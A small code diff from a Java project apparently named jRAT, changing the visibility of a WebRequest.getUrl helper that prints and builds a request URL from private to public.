@@ -13,7 +13,7 @@ import pro.jrat.utils.Utils;
 
 public class WebRequest {
 	
-	private static URL getUrl(String surl) throws Exception {
+	public static URL getUrl(String surl) throws Exception {
 		System.out.println("Requesting " + surl);
 		
 		URL url = null;
